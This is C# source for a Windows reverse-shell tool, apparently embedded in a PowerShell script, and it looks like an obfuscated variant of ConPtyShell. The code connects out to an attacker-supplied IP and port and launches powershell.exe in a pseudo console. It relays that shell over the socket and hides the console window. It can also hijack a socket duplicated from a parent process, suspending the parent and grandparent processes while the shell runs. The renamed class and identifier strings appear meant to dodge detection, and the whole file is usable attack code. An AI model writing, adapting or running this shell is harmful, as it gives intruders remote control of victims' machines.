    private static extern bool CreateProcessEx(string lpApplicationName, string lpCommandLine, ref SECURITY_ATTRIBUTES lpProcessAttributes, ref SECURITY_ATTRIBUTES lpThreadAttributes, bool bInheritHandles, uint dwCreationFlags, IntPtr lpEnvironment, string lpCurrentDirectory, [In] ref STARTUPINFOEX lpStartupInfo, out PROCESS_INFORMATION lpProcessInformation);

    [DllImport("kernel32.dll", SetLastError = true, CharSet = CharSet.Auto, EntryPoint = "CreateProcess")]
    private static extern bool CreateProcess(string lpApplicationName, string lpCommandLine, IntPtr lpProcessAttributes, IntPtr lpThreadAttributes, bool bInheritHandles, uint dwCreationFlags, IntPtr lpEnvironment, string lpCurrentDirectory, [In] ref STARTUPINFO lpStartupInfo, out PROCESS_INFORMATION lpProcessInformation);

    [DllImport("kernel32.dll", SetLastError = true)]
    [return: MarshalAs(UnmanagedType.Bool)]
    private static extern bool TerminateProcess(IntPtr hProcess, uint uExitCode);

    [DllImport("kernel32.dll", SetLastError = true)]
    private static extern UInt32 WaitForSingleObject(IntPtr hHandle, UInt32 dwMilliseconds);

    [DllImport("kernel32.dll", SetLastError = true)]
    private static extern bool SetStdHandle(int nStdHandle, IntPtr hHandle);

    [DllImport("kernel32.dll", SetLastError = true)]
    private static extern IntPtr GetStdHandle(int nStdHandle);

    [DllImport("kernel32.dll", SetLastError = true)]
    private static extern bool CloseHandle(IntPtr hObject);

    [DllImport("kernel32.dll", CharSet = CharSet.Auto, SetLastError = true)]
    private static extern bool CreatePipe(out IntPtr hReadPipe, out IntPtr hWritePipe, ref SECURITY_ATTRIBUTES lpPipeAttributes, int nSize);

    [DllImport("kernel32.dll", CharSet = CharSet.Auto, CallingConvention = CallingConvention.StdCall, SetLastError = true)]
    private static extern IntPtr CreateFile(string lpFileName, uint dwDesiredAccess, uint dwShareMode, IntPtr SecurityAttributes, uint dwCreationDisposition, uint dwFlagsAndAttributes, IntPtr hTemplateFile);

    [DllImport("kernel32.dll", SetLastError = true)]
    private static extern bool ReadFile(IntPtr hFile, [Out] byte[] lpBuffer, uint nNumberOfBytesToRead, out uint lpNumberOfBytesRead, IntPtr lpOverlapped);

    [DllImport("kernel32.dll", SetLastError = true)]
    private static extern bool WriteFile(IntPtr hFile, byte[] lpBuffer, uint nNumberOfBytesToWrite, out uint lpNumberOfBytesWritten, IntPtr lpOverlapped);

    [DllImport("kernel32.dll", SetLastError = true)]
    private static extern int CreatePseudoConsole(COORD size, IntPtr hInput, IntPtr hOutput, uint dwFlags, out IntPtr phPC);

    [DllImport("kernel32.dll", SetLastError = true)]
    private static extern int ClosePseudoConsole(IntPtr hPC);

    [DllImport("kernel32.dll", SetLastError = true)]
    private static extern bool SetConsoleMode(IntPtr hConsoleHandle, uint mode);

    [DllImport("kernel32.dll", SetLastError = true)]
    private static extern bool GetConsoleMode(IntPtr handle, out uint mode);

    [DllImport("kernel32.dll")]
    [return: MarshalAs(UnmanagedType.Bool)]
    private static extern bool AllocConsole();

    [DllImport("kernel32.dll", SetLastError = true, ExactSpelling = true)]
    private static extern bool FreeConsole();

    [DllImport("user32.dll")]
    private static extern bool ShowWindow(IntPtr hWnd, int nCmdShow);

    [DllImport("kernel32.dll")]
    private static extern IntPtr GetConsoleWindow();

    [DllImport("kernel32.dll", CharSet = CharSet.Auto)]
    private static extern IntPtr GetModuleHandle(string lpModuleName);

    [DllImport("kernel32", CharSet = CharSet.Ansi, ExactSpelling = true, SetLastError = true)]
    private static extern IntPtr GetProcAddress(IntPtr hModule, string procName);

    [DllImport("ws2_32.dll", CharSet = CharSet.Ansi, SetLastError = true)]
    private static extern IntPtr WSASocket([In] AddressFamily addressFamily, [In] SocketType socketType, [In] ProtocolType protocolType, [In] IntPtr protocolInfo, [In] uint group, [In] int flags);

    [DllImport("ws2_32.dll", SetLastError = true)]
    private static extern int connect(IntPtr s, ref SOCKADDR_IN addr, int addrsize);

    [DllImport("ws2_32.dll", SetLastError = true)]
    private static extern ushort htons(ushort hostshort);

    [DllImport("ws2_32.dll", CharSet = CharSet.Ansi, SetLastError = true)]
    private static extern uint inet_addr(string cp);

    [DllImport("ws2_32.dll", CharSet = CharSet.Auto)]
    private static extern Int32 WSAGetLastError();

    [DllImport("ws2_32.dll", CharSet = CharSet.Auto, SetLastError = true)]
    private static extern Int32 WSAStartup(Int16 wVersionRequested, out WSAData wsaData);

    [DllImport("ws2_32.dll", CharSet = CharSet.Unicode, SetLastError = true)]
    private static extern int closesocket(IntPtr s);

    [DllImport("ws2_32.dll", CharSet = CharSet.Auto, SetLastError = true)]
    private static extern int recv(IntPtr Socket, byte[] buf, int len, uint flags);

    [DllImport("ws2_32.dll", CharSet = CharSet.Auto, SetLastError = true)]
    private static extern int send(IntPtr Socket, byte[] buf, int len, uint flags);

    [DllImport("WS2_32.DLL", CharSet = CharSet.Auto, SetLastError = true)]
    private static extern IntPtr WSACreateEvent();

    [DllImport("WS2_32.DLL", CharSet = CharSet.Auto, SetLastError = true)]
    private static extern int WSAEventSelect(IntPtr s, IntPtr hEventObject, int lNetworkEvents);

    [DllImport("WS2_32.DLL", CharSet = CharSet.Auto, SetLastError = true)]
    private static extern int WSAWaitForMultipleEvents(int cEvents, IntPtr[] lphEvents, bool fWaitAll, int dwTimeout, bool fAlertable);

    [DllImport("WS2_32.DLL", CharSet = CharSet.Auto, SetLastError = true)]
    private static extern bool WSAResetEvent(IntPtr hEvent);

    [DllImport("WS2_32.DLL", CharSet = CharSet.Auto, SetLastError = true)]
    private static extern bool WSACloseEvent(IntPtr hEvent);

    [DllImport("ntdll.dll")]
    private static extern uint NtSuspendProcess(IntPtr processHandle);

    [DllImport("ntdll.dll")]
    private static extern uint NtResumeProcess(IntPtr processHandle);

    private static void InitWSAThread()
    {
        WSAData data;
        if (WSAStartup(2 << 8 | 2, out data) != 0)
            throw new cPTYx(String.Format("WSAStartup failed with error code: {0}", WSAGetLastError()));
    }

    private static IntPtr connectRemote(string remoteIp, int remotePort)
    {
        int port = 0;
        int error = 0;
        string host = remoteIp;

        try
        {
            port = Convert.ToInt32(remotePort);
        }
        catch
        {
            throw new cPTYx("Specified port is invalid: " + remotePort.ToString());
        }

        IntPtr socket = IntPtr.Zero;
        socket = WSASocket(AddressFamily.InterNetwork, SocketType.Stream, ProtocolType.IP, IntPtr.Zero, 0, WSA_FLAG_OVERLAPPED);
        SOCKADDR_IN sockinfo = new SOCKADDR_IN();
        sockinfo.sin_family = (short)2;
        sockinfo.sin_addr = inet_addr(host);
        sockinfo.sin_port = (short)htons((ushort)port);

        if (connect(socket, ref sockinfo, Marshal.SizeOf(sockinfo)) != 0)
        {
            error = WSAGetLastError();
            throw new cPTYx(String.Format("WSAConnect failed with error code: {0}", error));
        }

        return socket;
    }

    private static void TryParseRowsColsFromSocket(IntPtr shellSocket, ref uint rows, ref uint cols)
    {
        Thread.Sleep(500);
        byte[] received = new byte[100];
        int rowsTemp, colsTemp;
        int bytesReceived = recv(shellSocket, received, 100, 0);
        try
        {
            string sizeReceived = Encoding.ASCII.GetString(received, 0, bytesReceived);
            string rowsString = sizeReceived.Split(' ')[0].Trim();
            string colsString = sizeReceived.Split(' ')[1].Trim();
            if (Int32.TryParse(rowsString, out rowsTemp) && Int32.TryParse(colsString, out colsTemp))
            {
                rows = (uint)rowsTemp;
                cols = (uint)colsTemp;
            }
        }
        catch
        {
            return;
        }
    }

    private static void CreatePipes(ref IntPtr InputPipeRead, ref IntPtr InputPipeWrite, ref IntPtr OutputPipeRead, ref IntPtr OutputPipeWrite)
    {
        SECURITY_ATTRIBUTES pSec = new SECURITY_ATTRIBUTES();
        pSec.nLength = Marshal.SizeOf(pSec);
        pSec.bInheritHandle = 1;
        pSec.lpSecurityDescriptor = IntPtr.Zero;
        if (!CreatePipe(out InputPipeRead, out InputPipeWrite, ref pSec, BUFFER_SIZE_PIPE))
            throw new cPTYx("Could not create the InputPipe");
        if (!CreatePipe(out OutputPipeRead, out OutputPipeWrite, ref pSec, BUFFER_SIZE_PIPE))
            throw new cPTYx("Could not create the OutputPipe");
    }

    private static void InitConsole(ref IntPtr oldStdIn, ref IntPtr oldStdOut, ref IntPtr oldStdErr)
    {
        oldStdIn = GetStdHandle(STD_INPUT_HANDLE);
        oldStdOut = GetStdHandle(STD_OUTPUT_HANDLE);
        oldStdErr = GetStdHandle(STD_ERROR_HANDLE);
        IntPtr hStdout = CreateFile("CONOUT$", GENERIC_READ | GENERIC_WRITE, FILE_SHARE_READ | FILE_SHARE_WRITE, IntPtr.Zero, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, IntPtr.Zero);
        IntPtr hStdin = CreateFile("CONIN$", GENERIC_READ | GENERIC_WRITE, FILE_SHARE_READ | FILE_SHARE_WRITE, IntPtr.Zero, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, IntPtr.Zero);
        SetStdHandle(STD_OUTPUT_HANDLE, hStdout);
        SetStdHandle(STD_ERROR_HANDLE, hStdout);
        SetStdHandle(STD_INPUT_HANDLE, hStdin);
    }

    private static void RestoreStdHandles(IntPtr oldStdIn, IntPtr oldStdOut, IntPtr oldStdErr)
    {
        SetStdHandle(STD_OUTPUT_HANDLE, oldStdOut);
        SetStdHandle(STD_ERROR_HANDLE, oldStdErr);
        SetStdHandle(STD_INPUT_HANDLE, oldStdIn);
    }

    private static void EnableVirtualTerminalSequenceProcessing()
    {
        uint outConsoleMode = 0;
        IntPtr hStdOut = GetStdHandle(STD_OUTPUT_HANDLE);
        if (!GetConsoleMode(hStdOut, out outConsoleMode))
        {
            throw new cPTYx("Could not get console mode");
        }
        outConsoleMode |= ENABLE_VIRTUAL_TERMINAL_PROCESSING | DISABLE_NEWLINE_AUTO_RETURN;
        if (!SetConsoleMode(hStdOut, outConsoleMode))
        {
            throw new cPTYx("Could not enable virtual terminal processing");
        }
    }

    private static int CreatePseudoConsoleWithPipes(ref IntPtr handlePseudoConsole, ref IntPtr eRv6yTYhInputPipeRead, ref IntPtr eRv6yTYhOutputPipeWrite, uint rows, uint cols)
    {
        int result = -1;
        EnableVirtualTerminalSequenceProcessing();
        COORD consoleCoord = new COORD();
        consoleCoord.X = (short)cols;
        consoleCoord.Y = (short)rows;
        result = CreatePseudoConsole(consoleCoord, eRv6yTYhInputPipeRead, eRv6yTYhOutputPipeWrite, 0, out handlePseudoConsole);
        return result;
    }

    private static STARTUPINFOEX ConfigureProcessThread(IntPtr handlePseudoConsole, IntPtr attributes)
    {
        IntPtr lpSize = IntPtr.Zero;
        bool success = InitializeProcThreadAttributeList(IntPtr.Zero, 1, 0, ref lpSize);
        if (success || lpSize == IntPtr.Zero)
        {
            throw new cPTYx("Could not calculate the number of bytes for the attribute list. " + Marshal.GetLastWin32Error());
        }
        STARTUPINFOEX startupInfo = new STARTUPINFOEX();
        startupInfo.StartupInfo.cb = Marshal.SizeOf(startupInfo);
        startupInfo.lpAttributeList = Marshal.AllocHGlobal(lpSize);
        success = InitializeProcThreadAttributeList(startupInfo.lpAttributeList, 1, 0, ref lpSize);
        if (!success)
        {
            throw new cPTYx("Could not set up attribute list. " + Marshal.GetLastWin32Error());
        }
        success = UpdateProcThreadAttribute(startupInfo.lpAttributeList, 0, attributes, handlePseudoConsole, (IntPtr)IntPtr.Size, IntPtr.Zero, IntPtr.Zero);
        if (!success)
        {
            throw new cPTYx("Could not set pseudoconsole thread attribute. " + Marshal.GetLastWin32Error());
        }
        return startupInfo;
    }

    private static PROCESS_INFORMATION RunProcess(ref STARTUPINFOEX sInfoEx, string commandLine)
    {
        PROCESS_INFORMATION pInfo = new PROCESS_INFORMATION();
        SECURITY_ATTRIBUTES pSec = new SECURITY_ATTRIBUTES();
        int securityAttributeSize = Marshal.SizeOf(pSec);
        pSec.nLength = securityAttributeSize;
        SECURITY_ATTRIBUTES tSec = new SECURITY_ATTRIBUTES();
        tSec.nLength = securityAttributeSize;
        bool success = CreateProcessEx(null, commandLine, ref pSec, ref tSec, false, EXTENDED_STARTUPINFO_PRESENT, IntPtr.Zero, null, ref sInfoEx, out pInfo);
        if (!success)
        {
            throw new cPTYx("Could not create process. " + Marshal.GetLastWin32Error());
        }
        return pInfo;
    }

    private static PROCESS_INFORMATION CreateChildProcessWithPseudoConsole(IntPtr handlePseudoConsole, string commandLine)
    {
        STARTUPINFOEX startupInfo = ConfigureProcessThread(handlePseudoConsole, (IntPtr)PROC_THREAD_ATTRIBUTE_PSEUDOCONSOLE);
        PROCESS_INFORMATION processInfo = RunProcess(ref startupInfo, commandLine);
        return processInfo;
    }

    private static void ThreadReadPipeWriteSocketOverlapped(object threadParams)
    {
        object[] threadParameters = (object[])threadParams;
        IntPtr OutputPipeRead = (IntPtr)threadParameters[0];
        IntPtr shellSocket = (IntPtr)threadParameters[1];
        int bufferSize = 8192;
        bool readSuccess = false;
        Int32 bytesSent = 0;
        uint dwBytesRead = 0;
        do
        {
            byte[] bytesToWrite = new byte[bufferSize];
            readSuccess = ReadFile(OutputPipeRead, bytesToWrite, (uint)bufferSize, out dwBytesRead, IntPtr.Zero);
            bytesSent = send(shellSocket, bytesToWrite, (int)dwBytesRead, 0);
        } while (bytesSent > 0 && readSuccess);
    }

    private static void ThreadReadPipeWriteSocketNonOverlapped(object threadParams)
    {
        object[] threadParameters = (object[])threadParams;
        IntPtr OutputPipeRead = (IntPtr)threadParameters[0];
        IntPtr shellSocket = (IntPtr)threadParameters[1];
        int bufferSize = 8192;
        bool readSuccess = false;
        Int32 bytesSent = 0;
        uint dwBytesRead = 0;
        do
        {
            byte[] bytesToWrite = new byte[bufferSize];
            readSuccess = ReadFile(OutputPipeRead, bytesToWrite, (uint)bufferSize, out dwBytesRead, IntPtr.Zero);
            do
            {
                bytesSent = send(shellSocket, bytesToWrite, (int)dwBytesRead, 0);
            } while (WSAGetLastError() == WSAEWOULDBLOCK);
        } while (bytesSent > 0 && readSuccess);
    }

    private static Thread StartThreadReadPipeWriteSocket(IntPtr OutputPipeRead, IntPtr shellSocket, bool overlappedSocket)
    {
        object[] threadParameters = new object[2];
        threadParameters[0] = OutputPipeRead;
        threadParameters[1] = shellSocket;
        Thread thThreadReadPipeWriteSocket;
        if(overlappedSocket)
            thThreadReadPipeWriteSocket = new Thread(ThreadReadPipeWriteSocketOverlapped);
        else
            thThreadReadPipeWriteSocket = new Thread(ThreadReadPipeWriteSocketNonOverlapped);
        thThreadReadPipeWriteSocket.Start(threadParameters);
        return thThreadReadPipeWriteSocket;
    }

    private static void ThreadReadSocketWritePipeOverlapped(object threadParams)
    {
        object[] threadParameters = (object[])threadParams;
        IntPtr InputPipeWrite = (IntPtr)threadParameters[0];
        IntPtr shellSocket = (IntPtr)threadParameters[1];
        IntPtr hChildProcess = (IntPtr)threadParameters[2];
        int bufferSize = 8192;
        bool writeSuccess = false;
        Int32 nBytesReceived = 0;
        uint bytesWritten = 0;
        do
        {
            byte[] bytesReceived = new byte[bufferSize];
            nBytesReceived = recv(shellSocket, bytesReceived, bufferSize, 0);
            writeSuccess = WriteFile(InputPipeWrite, bytesReceived, (uint)nBytesReceived, out bytesWritten, IntPtr.Zero);
        } while (nBytesReceived > 0 && writeSuccess);
        TerminateProcess(hChildProcess, 0);
    }

    private static void ThreadReadSocketWritePipeNonOverlapped(object threadParams)
    {
        object[] threadParameters = (object[])threadParams;
        IntPtr InputPipeWrite = (IntPtr)threadParameters[0];
        IntPtr shellSocket = (IntPtr)threadParameters[1];
        IntPtr hChildProcess = (IntPtr)threadParameters[2];
        int bufferSize = 8192;
        bool writeSuccess = false;
        Int32 nBytesReceived = 0;
        uint bytesWritten = 0;
        bool socketBlockingOperation = false;
        IntPtr wsaReadEvent = WSACreateEvent();
        WSAEventSelect(shellSocket, wsaReadEvent, FD_READ);
        IntPtr[] wsaEventsArray = new IntPtr[] { wsaReadEvent };
        do
        {
            byte[] bytesReceived = new byte[bufferSize];
            WSAWaitForMultipleEvents(wsaEventsArray.Length, wsaEventsArray, true, 500, false);
            nBytesReceived = recv(shellSocket, bytesReceived, bufferSize, 0);
            if (WSAGetLastError() == WSAEWOULDBLOCK)
            {
                socketBlockingOperation = true;
                continue;
            }
            WSAResetEvent(wsaReadEvent);
            socketBlockingOperation = false;
            writeSuccess = WriteFile(InputPipeWrite, bytesReceived, (uint)nBytesReceived, out bytesWritten, IntPtr.Zero);
        } while (socketBlockingOperation || (nBytesReceived > 0 && writeSuccess));
        WSACloseEvent(wsaReadEvent);
        TerminateProcess(hChildProcess, 0);
    }

    private static Thread StartThreadReadSocketWritePipe(IntPtr InputPipeWrite, IntPtr shellSocket, IntPtr hChildProcess, bool overlappedSocket)
    {
        object[] threadParameters = new object[3];
        threadParameters[0] = InputPipeWrite;
        threadParameters[1] = shellSocket;
        threadParameters[2] = hChildProcess;
        Thread thReadSocketWritePipe;
        if(overlappedSocket)
            thReadSocketWritePipe = new Thread(ThreadReadSocketWritePipeOverlapped);
        else
            thReadSocketWritePipe = new Thread(ThreadReadSocketWritePipeNonOverlapped);
        thReadSocketWritePipe.Start(threadParameters);
        return thReadSocketWritePipe;
    }

    public static string SpawneRv6yTYhShell(string remoteIp, int remotePort, uint rows, uint cols, string commandLine, bool upgradeShell)
    {
        IntPtr shellSocket = IntPtr.Zero;
        IntPtr InputPipeRead = IntPtr.Zero;
        IntPtr InputPipeWrite = IntPtr.Zero;
        IntPtr OutputPipeRead = IntPtr.Zero;
        IntPtr OutputPipeWrite = IntPtr.Zero;
        IntPtr handlePseudoConsole = IntPtr.Zero;
        IntPtr oldStdIn = IntPtr.Zero;
        IntPtr oldStdOut = IntPtr.Zero;
        IntPtr oldStdErr = IntPtr.Zero;
        bool newConsoleAllocated = false;
        bool parentSocketInherited = false;
        bool grandParentSocketInherited = false;
        bool eRv6yTYhCompatible = false;
        bool IsSocketOverlapped = true;
        string output = "";
        Process currentProcess = null;
        Process parentProcess = null;
        Process grandParentProcess = null;
        if (GetProcAddress(GetModuleHandle("kernel32"), "CreatePseudoConsole") != IntPtr.Zero)
            eRv6yTYhCompatible = true;
        PROCESS_INFORMATION childProcessInfo = new PROCESS_INFORMATION();
        CreatePipes(ref InputPipeRead, ref InputPipeWrite, ref OutputPipeRead, ref OutputPipeWrite);
        InitConsole(ref oldStdIn, ref oldStdOut, ref oldStdErr);
        InitWSAThread();
        if (eRv6yTYhCompatible)
        {
            Console.WriteLine("\r\nCreatePseudoConsole function found! Spawning a fully interactive shell\r\n");
            if (upgradeShell)
            {
                List<IntPtr> socketsHandles = new List<IntPtr>();
                currentProcess = Process.GetCurrentProcess();
                parentProcess = ParentProcessUtilities.GetParentProcess(currentProcess.Handle);
                if (parentProcess != null) grandParentProcess = ParentProcessUtilities.GetParentProcess(parentProcess.Handle);
                shellSocket = sHJck.DuplicateTargetProcessSocket(currentProcess, ref IsSocketOverlapped);
                if (shellSocket == IntPtr.Zero && parentProcess != null)
                {
                    shellSocket = sHJck.DuplicateTargetProcessSocket(parentProcess, ref IsSocketOverlapped);
                    if (shellSocket == IntPtr.Zero && grandParentProcess != null)
                    {
                        shellSocket = sHJck.DuplicateTargetProcessSocket(grandParentProcess, ref IsSocketOverlapped);
                        if (shellSocket == IntPtr.Zero)
                        {
                            throw new cPTYx("No \\Device\\Afd objects found. Socket duplication failed.");
                        }
                        else
                        {
                            grandParentSocketInherited = true;
                        }
                    }
                    else
                    {
                        parentSocketInherited = true;
                        if (grandParentProcess != null) grandParentSocketInherited = sHJck.IsSocketInherited(shellSocket, grandParentProcess);
                    }
                }
                else
                {
                    if (parentProcess != null) parentSocketInherited = sHJck.IsSocketInherited(shellSocket, parentProcess);
                    if (grandParentProcess != null) grandParentSocketInherited = sHJck.IsSocketInherited(shellSocket, grandParentProcess);
                }
            }
            else
            {
                shellSocket = connectRemote(remoteIp, remotePort);
                if (shellSocket == IntPtr.Zero)
                {
                    output += string.Format("{0}Could not connect to ip {1} on port {2}", errorString, remoteIp, remotePort.ToString());
                    return output;
                }
                TryParseRowsColsFromSocket(shellSocket, ref rows, ref cols);
            }
            if (GetConsoleWindow() == IntPtr.Zero)
            {
                AllocConsole();
                ShowWindow(GetConsoleWindow(), SW_HIDE);
                newConsoleAllocated = true;
            }

            int pseudoConsoleCreationResult = CreatePseudoConsoleWithPipes(ref handlePseudoConsole, ref InputPipeRead, ref OutputPipeWrite, rows, cols);
            if (pseudoConsoleCreationResult != 0)
            {
                output += string.Format("{0}Could not create psuedo console. Error Code {1}", errorString, pseudoConsoleCreationResult.ToString());
                return output;
            }
            childProcessInfo = CreateChildProcessWithPseudoConsole(handlePseudoConsole, commandLine);
        }
        else
        {
            if (upgradeShell)
            {
                output += string.Format("Could not upgrade shell to fully interactive because eRv6yTYh is not compatible on this system");
                return output;
            }
            shellSocket = connectRemote(remoteIp, remotePort);
            if (shellSocket == IntPtr.Zero)
            {
                output += string.Format("{0}Could not connect to ip {1} on port {2}", errorString, remoteIp, remotePort.ToString());
                return output;
            }
            Console.WriteLine("\r\nCreatePseudoConsole function not found! Spawning a netcat-like interactive shell...\r\n");
            STARTUPINFO sInfo = new STARTUPINFO();
            sInfo.cb = Marshal.SizeOf(sInfo);
            sInfo.dwFlags |= (Int32)STARTF_USESTDHANDLES;
            sInfo.hStdInput = InputPipeRead;
            sInfo.hStdOutput = OutputPipeWrite;
            sInfo.hStdError = OutputPipeWrite;
            CreateProcess(null, commandLine, IntPtr.Zero, IntPtr.Zero, true, 0, IntPtr.Zero, null, ref sInfo, out childProcessInfo);
        }

        if (InputPipeRead != IntPtr.Zero) CloseHandle(InputPipeRead);
        if (OutputPipeWrite != IntPtr.Zero) CloseHandle(OutputPipeWrite);
        if (upgradeShell) {
            if (parentSocketInherited) NtSuspendProcess(parentProcess.Handle);
            if (grandParentSocketInherited) NtSuspendProcess(grandParentProcess.Handle);
            if (!IsSocketOverlapped) sHJck.SetSocketBlockingMode(shellSocket, 1);
        }
        Thread thThreadReadPipeWriteSocket = StartThreadReadPipeWriteSocket(OutputPipeRead, shellSocket, IsSocketOverlapped);
        Thread thReadSocketWritePipe = StartThreadReadSocketWritePipe(InputPipeWrite, shellSocket, childProcessInfo.hProcess, IsSocketOverlapped);
        WaitForSingleObject(childProcessInfo.hProcess, INFINITE);
        thThreadReadPipeWriteSocket.Abort();
        thReadSocketWritePipe.Abort();
        if (upgradeShell)
        {
            if (!IsSocketOverlapped)
            {
                WSAEventSelect(shellSocket, IntPtr.Zero, 0);
                sHJck.SetSocketBlockingMode(shellSocket, 0);
            }
            if (parentSocketInherited) NtResumeProcess(parentProcess.Handle);
            if (grandParentSocketInherited) NtResumeProcess(grandParentProcess.Handle);
        }
        closesocket(shellSocket);
        RestoreStdHandles(oldStdIn, oldStdOut, oldStdErr);
        if (newConsoleAllocated)
            FreeConsole();
        CloseHandle(childProcessInfo.hThread);
        CloseHandle(childProcessInfo.hProcess);
        if (handlePseudoConsole != IntPtr.Zero) ClosePseudoConsole(handlePseudoConsole);
        if (InputPipeWrite != IntPtr.Zero) CloseHandle(InputPipeWrite);
        if (OutputPipeRead != IntPtr.Zero) CloseHandle(OutputPipeRead);
        output += "eRv6yTYhShell kindly exited.\r\n";
        return output;
    }
}

public static class cPTYsMC
{
    private static string help = @"";

    private static bool HelpRequired(string param)
    {
        return param == "-h" || param == "--help" || param == "/?";
    }

    private static void CheckArgs(string[] arguments)
    {
        if (arguments.Length < 2)
            throw new cPTYx("\r\neRv6yTYhShell: Not enough arguments. 2 Arguments required. Use --help for additional help.\r\n");
    }

    private static void DisplayHelp()
    {
        Console.Out.Write(help);
    }

    private static string CheckRemoteIpArg(string ipString)
    {
        IPAddress address;
        if (!IPAddress.TryParse(ipString, out address))
            throw new cPTYx("\r\neRv6yTYhShell: Invalid remoteIp value" + ipString);
        return ipString;
    }

    private static int CheckInt(string arg)
    {
        int ret = 0;
        if (!Int32.TryParse(arg, out ret))
            throw new cPTYx("\r\neRv6yTYhShell: Invalid integer value " + arg);
        return ret;
    }

    private static uint ParseRows(string[] arguments)
    {
        uint rows = 24;
        if (arguments.Length > 2)
            rows = (uint)CheckInt(arguments[2]);
        return rows;
    }

    private static uint ParseCols(string[] arguments)
    {
        uint cols = 80;
        if (arguments.Length > 3)
            cols = (uint)CheckInt(arguments[3]);
        return cols;
    }

    private static string ParseCommandLine(string[] arguments)
    {
        string commandLine = "powershell.exe";
        if (arguments.Length > 4)
            commandLine = arguments[4];
        return commandLine;
    }

    public static string cPTYs33ed(string[] args)
    {
        string output = "";
        if (args.Length == 1 && HelpRequired(args[0]))
        {
            DisplayHelp();
        }
        else
        {
            string remoteIp = "";
            int remotePort = 0;
            bool upgradeShell = false;
            try
            {
                CheckArgs(args);
                if (args[0].Contains("upgrade"))
                    upgradeShell = true;
                else
                {
                    remoteIp = CheckRemoteIpArg(args[0]);
                    remotePort = CheckInt(args[1]);
                }
                uint rows = ParseRows(args);
                uint cols = ParseCols(args);
                string commandLine = ParseCommandLine(args);
                output = eRv6yTYhShell.SpawneRv6yTYhShell(remoteIp, remotePort, rows, cols, commandLine, upgradeShell);
            }
            catch (Exception e)
            {
                Console.WriteLine("\n" + e.ToString() + "\n");
            }
        }
        return output;
    }
}


class MainClass
{
    static void Main(string[] args)
    {
        Console.Out.Write(cPTYsMC.cPTYs33ed(args));
    }
}

"@;
